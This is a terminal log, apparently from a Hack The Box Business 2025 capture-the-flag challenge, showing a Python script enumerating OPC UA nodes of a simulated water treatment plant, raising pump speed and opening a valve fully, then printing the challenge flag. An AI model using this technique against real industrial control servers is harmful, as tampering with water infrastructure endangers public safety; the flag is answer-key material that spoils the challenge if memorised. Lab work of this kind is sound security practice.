```
┌──(venv)─(kali㉿kali)-[~/Desktop/htb/business-2025]
└─$ python opcua-script.py
Getting overview ...

Nodes:
  Server
  WaterTreatmentPlant

Childs (WaterTreatmentPlant): 
  Pump
    Status: True (NumericNodeId(ns=2;i=3))
    Speed: 1200.0 (NumericNodeId(ns=2;i=4))
  Tank
    WaterLevel: 2.4360291972243764 (NumericNodeId(ns=2;i=6))
    Volume: 2500.0 (NumericNodeId(ns=2;i=7))
  Valve
    Status: True (NumericNodeId(ns=2;i=9))
    PercentOpen: 75.0 (NumericNodeId(ns=2;i=10))
  Sensors
    Pressure: 3.1485218492069245 (NumericNodeId(ns=2;i=12))
    FlowRate: 10.075538378535311 (NumericNodeId(ns=2;i=13))
  Maintenance
    SecretLog: Null (NumericNodeId(ns=2;i=15))

Manipulating values (and wait a bit for flag) ...
Printing new values ...

  Pump
    Status: True
    Speed: 1600.0
  Tank
    WaterLevel: 4.939609173145405
    Volume: 2500.0
  Valve
    Status: True
    PercentOpen: 100.0
  Sensors
    Pressure: 3.132828404899001
    FlowRate: 4.117678895399377
  Maintenance
    SecretLog: HTB{w4t3r_tr34tm3nt_0v3rfl0w3d}
                                                                                                                                                            
┌──(venv)─(kali㉿kali)-[~/Desktop/htb/business-2025]
└─$ 
```
